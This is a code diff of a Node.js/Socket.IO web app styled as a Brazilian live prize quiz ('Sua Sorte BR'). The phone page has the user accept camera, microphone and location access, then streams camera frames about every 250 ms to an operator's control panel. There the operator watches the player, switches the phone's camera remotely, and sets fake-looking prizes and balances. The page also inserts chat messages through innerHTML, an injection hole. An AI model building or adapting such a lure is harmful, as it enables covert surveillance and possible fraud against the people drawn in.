@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
   res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
 });
 
-// ==================== CELULAR - SUA SORTE BR (MELHORADO) ====================
+// ==================== CELULAR ====================
 function getMobileHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -27,79 +27,53 @@ function getMobileHTML(fullUrl) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
     <title>Sua Sorte BR</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500;600;700&display=swap');
-        
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Poppins', sans-serif;
-            background: linear-gradient(135deg, #0f001a, #2a0044);
+            background: linear-gradient(135deg, #0a001f, #2a0044);
             color: white;
             height: 100vh;
             overflow: hidden;
         }
-
         .header {
-            background: linear-gradient(to right, #ff00cc, #00ffcc);
-            padding: 14px 16px;
+            background: linear-gradient(to right, #ff00cc, #00ff88);
+            padding: 16px;
             text-align: center;
-            font-size: 21px;
-            font-weight: 700;
-            box-shadow: 0 4px 20px rgba(255,0,204,0.6);
+            font-size: 22px;
+            font-weight: bold;
         }
-
-        .top-bar {
+        .top-info {
             background: #1f0033;
             padding: 12px 16px;
             display: flex;
             justify-content: space-between;
-            align-items: center;
             font-size: 15px;
         }
-        .balance { color: #00ff88; font-weight: 700; }
+        .balance { color: #00ff88; font-weight: bold; }
 
         .question-area {
             background: #2a0044;
             padding: 20px 16px;
             text-align: center;
-            border-bottom: 4px solid #ff00cc;
         }
-        .prize {
-            color: #ffd700;
-            font-size: 18px;
-            margin-bottom: 8px;
-        }
-        .question {
-            font-size: 19px;
-            font-weight: 600;
-            margin: 12px 0;
-            min-height: 52px;
-        }
-        .timer {
-            font-size: 36px;
-            font-weight: 700;
-            color: #ff00cc;
-        }
+        .prize { color: #ffd700; font-size: 17px; margin-bottom: 6px; }
+        .question { font-size: 18px; margin: 10px 0; min-height: 50px; }
+        .timer { font-size: 38px; font-weight: bold; color: #ff00cc; }
 
         .messages {
             flex: 1;
             overflow-y: auto;
             padding: 16px;
-            background: rgba(0,0,0,0.4);
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
+            background: rgba(0,0,0,0.5);
         }
-        .message {
-            display: flex;
-            margin-bottom: 10px;
-        }
-        .message.sent { justify-content: flex-end; }
-        .message.received { justify-content: flex-start; }
+        .message { margin-bottom: 12px; }
+        .message.sent { text-align: right; }
+        .message.received { text-align: left; }
         .bubble {
+            display: inline-block;
+            padding: 12px 16px;
+            border-radius: 18px;
             max-width: 80%;
-            padding: 13px 17px;
-            border-radius: 20px;
-            font-size: 16px;
         }
         .message.sent .bubble { background: #00ff88; color: black; }
         .message.received .bubble { background: #ff00cc; color: white; }
@@ -108,7 +82,7 @@ function getMobileHTML(fullUrl) {
             background: #1f0033;
             padding: 14px 16px;
             display: flex;
-            gap: 12px;
+            gap: 10px;
         }
         .input-field {
             flex: 1;
@@ -120,20 +94,20 @@ function getMobileHTML(fullUrl) {
             font-size: 16px;
         }
         .send-btn {
-            background: linear-gradient(#00ff88, #00cc66);
+            background: #00ff88;
             color: black;
             border: none;
-            width: 54px;
-            height: 54px;
+            width: 52px;
+            height: 52px;
             border-radius: 50%;
             font-size: 24px;
             cursor: pointer;
         }
 
-        .consent-screen {
+        .consent {
             position: absolute;
             inset: 0;
-            background: rgba(15,0,26,0.98);
+            background: rgba(10,0,31,0.98);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -143,58 +117,54 @@ function getMobileHTML(fullUrl) {
         .consent-box {
             background: #1f0033;
             border: 3px solid #ff00cc;
-            border-radius: 24px;
-            padding: 32px 24px;
+            border-radius: 20px;
+            padding: 30px 25px;
             text-align: center;
             max-width: 340px;
         }
         .start-btn {
-            background: linear-gradient(to right, #ff00cc, #00ff88);
+            background: linear-gradient(#ff00cc, #00ff88);
             color: black;
-            font-weight: bold;
             border: none;
             padding: 16px;
             border-radius: 50px;
             font-size: 17px;
             width: 100%;
-            margin-top: 25px;
+            margin-top: 20px;
             cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <!-- TELA DE CONSENTIMENTO -->
-    <div class="consent-screen" id="consentScreen">
+    <div class="consent" id="consent">
         <div class="consent-box">
             <h2>🔥 SUA SORTE BR 🔥</h2>
-            <p><strong>Jogo de Perguntas ao Vivo</strong></p>
-            <p>O operador controla as perguntas e prêmios.</p>
-            <p>Ao continuar você permite câmera, microfone e localização.</p>
-            <button class="start-btn" id="acceptBtn">ACEITAR E JOGAR</button>
+            <p>Jogo ao vivo controlado pelo operador.</p>
+            <p>Você permite câmera, microfone e localização.</p>
+            <button class="start-btn" id="startBtn">ACEITAR E JOGAR</button>
         </div>
     </div>
 
-    <!-- TELA DO JOGO -->
-    <div class="game-container" id="gameScreen" style="display:none; flex-direction:column; height:100vh;">
+    <div id="game" style="display:none; flex-direction:column; height:100vh;">
         <div class="header">SUA SORTE BR</div>
-
-        <div class="top-bar">
+        
+        <div class="top-info">
             <span>Saldo:</span>
             <span class="balance" id="balance">R$ 0,00</span>
         </div>
 
         <div class="question-area">
             <div class="prize" id="prize">Prêmio: R$ 0,00</div>
-            <div class="question" id="questionText">Aguardando pergunta...</div>
+            <div class="question" id="question">Aguardando pergunta...</div>
             <div class="timer" id="timer">00</div>
         </div>
 
         <div class="messages" id="messages"></div>
 
         <div class="input-area">
-            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta aqui...">
-            <button class="send-btn" id="sendBtn">➤</button>
+            <input type="text" class="input-field" id="input" placeholder="Digite sua resposta...">
+            <button class="send-btn" id="send">➤</button>
         </div>
     </div>
 
@@ -203,106 +173,91 @@ function getMobileHTML(fullUrl) {
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io('${fullUrl}');
-
-        let mediaStream = null;
+        let stream = null;
         let facingMode = 'user';
-        let permissions = false;
         let balance = 0;
-        let frameInterval = null;
 
-        const consentScreen = document.getElementById('consentScreen');
-        const gameScreen = document.getElementById('gameScreen');
-        const messagesDiv = document.getElementById('messages');
-        const messageInput = document.getElementById('messageInput');
-        const sendBtn = document.getElementById('sendBtn');
-        const questionText = document.getElementById('questionText');
+        const consent = document.getElementById('consent');
+        const game = document.getElementById('game');
+        const messages = document.getElementById('messages');
+        const input = document.getElementById('input');
+        const questionEl = document.getElementById('question');
         const timerEl = document.getElementById('timer');
         const prizeEl = document.getElementById('prize');
         const balanceEl = document.getElementById('balance');
 
-        function addMessage(text, isSent = true) {
+        function addMessage(text, isSent) {
             const div = document.createElement('div');
             div.className = \`message \${isSent ? 'sent' : 'received'}\`;
             div.innerHTML = \`<div class="bubble">\${text}</div>\`;
-            messagesDiv.appendChild(div);
-            messagesDiv.scrollTop = messagesDiv.scrollHeight;
+            messages.appendChild(div);
+            messages.scrollTop = messages.scrollHeight;
         }
 
-        function sendFrame() {
-            if (!permissions || !localVideo.videoWidth) return;
-            const canvas = document.createElement('canvas');
-            canvas.width = 280;
-            canvas.height = 210;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(localVideo, 0, 0, 280, 210);
-            socket.emit('frame', canvas.toDataURL('image/jpeg', 0.7));
-        }
-
-        async function startGame() {
+        async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 640, height: 480, facingMode },
                     audio: true
                 });
+                document.getElementById('localVideo').srcObject = stream;
 
-                mediaStream = stream;
-                localVideo.srcObject = stream;
-                await localVideo.play();
+                setInterval(() => {
+                    if (!stream) return;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 260; canvas.height = 195;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(document.getElementById('localVideo'), 0, 0, 260, 195);
+                    socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
+                }, 250);
 
-                frameInterval = setInterval(sendFrame, 230);
-
-                permissions = true;
-                consentScreen.style.display = 'none';
-                gameScreen.style.display = 'flex';
-
+                consent.style.display = 'none';
+                game.style.display = 'flex';
                 socket.emit('mobile_online');
 
-            } catch (err) {
-                alert("Permita câmera e microfone para participar.");
+            } catch (e) {
+                alert("Erro ao acessar câmera. Permita o acesso.");
             }
         }
 
-        function sendMessage() {
-            const text = messageInput.value.trim();
-            if (!text) return;
-            addMessage(text, true);
-            socket.emit('message', text);
-            messageInput.value = '';
-        }
+        document.getElementById('startBtn').onclick = startCamera;
 
-        sendBtn.onclick = sendMessage;
-        messageInput.addEventListener('keypress', e => {
-            if (e.key === 'Enter') sendMessage();
+        document.getElementById('send').onclick = () => {
+            const text = input.value.trim();
+            if (text) {
+                addMessage(text, true);
+                socket.emit('message', text);
+                input.value = '';
+            }
+        };
+
+        input.addEventListener('keypress', e => {
+            if (e.key === 'Enter') document.getElementById('send').click();
         });
 
-        // Receber pergunta + prêmio
-        socket.on('question', (data) => {
-            questionText.textContent = data.question || "Pergunta recebida";
+        socket.on('question', data => {
+            questionEl.textContent = data.question || "Pergunta recebida";
             timerEl.textContent = data.time || "30";
-            prizeEl.textContent = `Prêmio: R$ ${parseFloat(data.prize || 0).toFixed(2)}`;
+            prizeEl.textContent = `Prêmio: R$ ${(data.prize || 0).toFixed(2)}`;
         });
 
-        socket.on('message', (msg) => addMessage(msg, false));
+        socket.on('message', msg => addMessage(msg, false));
 
-        // Atualizar saldo
-        socket.on('update_balance', (newBalance) => {
-            balance = newBalance;
+        socket.on('update_balance', amt => {
+            balance = amt;
             balanceEl.textContent = `R$ ${balance.toFixed(2)}`;
         });
 
-        document.getElementById('acceptBtn').onclick = startGame;
-
-        // Trocar câmera
         socket.on('toggle_camera', () => {
             facingMode = facingMode === 'user' ? 'environment' : 'user';
-            if (permissions) startGame();
+            startCamera();
         });
     </script>
 </body>
 </html>`;
 }
 
-// ==================== DESKTOP - CONTROLE ====================
+// ==================== DESKTOP ====================
 function getDesktopHTML(fullUrl) {
   return `<!DOCTYPE html>
 <html lang="pt-BR">
@@ -310,89 +265,75 @@ function getDesktopHTML(fullUrl) {
     <meta charset="UTF-8">
     <title>Sua Sorte BR - Controle</title>
     <style>
-        body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: white; margin:0; padding:20px; }
-        h1 { text-align:center; color:#ff00cc; margin-bottom:20px; }
+        body { font-family: 'Poppins', sans-serif; background:#0a0a0a; color:white; margin:0; padding:20px; }
+        h1 { text-align:center; color:#ff00cc; }
         #remoteVideo {
-            max-width: 100%;
-            max-height: 340px;
-            border: 4px solid #ff00cc;
-            border-radius: 12px;
-            background: black;
-            margin-bottom: 20px;
+            max-width:100%;
+            max-height:360px;
+            border:4px solid #ff00cc;
+            border-radius:12px;
+            background:black;
+            margin:20px 0;
         }
-        .controls { max-width: 700px; margin: 0 auto; display: grid; gap: 15px; }
+        .controls { max-width:700px; margin:0 auto; display:grid; gap:12px; }
         input, button {
-            padding: 14px;
-            font-size: 16px;
-            border-radius: 10px;
+            padding:15px;
+            font-size:16px;
+            border-radius:10px;
         }
-        input { background: #1f1f1f; border: 2px solid #ff00cc; color: white; }
+        input { background:#1f1f1f; border:2px solid #ff00cc; color:white; }
         button {
-            background: linear-gradient(#ff00cc, #00ffcc);
-            color: black;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
+            background:linear-gradient(#ff00cc,#00ff88);
+            color:black;
+            border:none;
+            font-weight:bold;
+            cursor:pointer;
         }
     </style>
 </head>
 <body>
     <h1>🎰 SUA SORTE BR - CONTROLE</h1>
-    
-    <div style="text-align:center;">
-        <img id="remoteVideo" src="" alt="Câmera do Jogador">
-    </div>
+    <img id="remoteVideo" src="" alt="Câmera">
 
     <div class="controls">
-        <input type="text" id="questionInput" placeholder="Digite a pergunta...">
-        <input type="number" id="timeInput" value="30" placeholder="Tempo (segundos)">
-        <input type="number" id="prizeInput" value="50" placeholder="Prêmio em R$">
-        <button onclick="sendQuestion()">Enviar Pergunta</button>
-        <button onclick="toggleCamera()">Trocar Câmera</button>
-        <button onclick="vibrate()">Vibrar Celular</button>
+        <input type="text" id="q" placeholder="Digite a pergunta">
+        <input type="number" id="t" value="30" placeholder="Tempo em segundos">
+        <input type="number" id="p" value="50" placeholder="Prêmio R$">
+        <button onclick="sendQ()">Enviar Pergunta</button>
+        <button onclick="toggleCam()">Trocar Câmera</button>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io('${fullUrl}');
-        const remoteVideo = document.getElementById('remoteVideo');
 
-        function sendQuestion() {
-            const question = document.getElementById('questionInput').value.trim();
-            const time = parseInt(document.getElementById('timeInput').value) || 30;
-            const prize = parseFloat(document.getElementById('prizeInput').value) || 0;
-
-            if (question) {
-                socket.emit('question', { question, time, prize });
-            }
+        function sendQ() {
+            const question = document.getElementById('q').value.trim();
+            const time = parseInt(document.getElementById('t').value) || 30;
+            const prize = parseFloat(document.getElementById('p').value) || 0;
+            if (question) socket.emit('question', {question, time, prize});
         }
 
-        function toggleCamera() { socket.emit('toggle_camera'); }
-        function vibrate() { socket.emit('vibrate'); }
+        function toggleCam() { socket.emit('toggle_camera'); }
 
-        socket.on('frame', (frame) => {
-            remoteVideo.src = frame;
+        socket.on('frame', frame => {
+            document.getElementById('remoteVideo').src = frame;
         });
-
-        socket.on('mobile_online', () => console.log("✅ Celular conectado"));
     </script>
 </body>
 </html>`;
 }
 
-// ==================== SOCKET.IO ====================
-io.on('connection', (socket) => {
-  console.log('Cliente conectado');
-
-  socket.on('message', (msg) => socket.broadcast.emit('message', msg));
-  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
-  socket.on('question', (data) => socket.broadcast.emit('question', data));
+// Socket
+io.on('connection', socket => {
+  socket.on('message', msg => socket.broadcast.emit('message', msg));
+  socket.on('frame', frame => socket.broadcast.emit('frame', frame));
+  socket.on('question', data => socket.broadcast.emit('question', data));
   socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
-  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
   socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`\n🔥 Sua Sorte BR rodando na porta ${PORT}`);
-  console.log(`Abra PRIMEIRO no CELULAR`);
+  console.log(`\n✅ Servidor rodando na porta ${PORT}`);
+  console.log(`Abra primeiro no CELULAR`);
 });
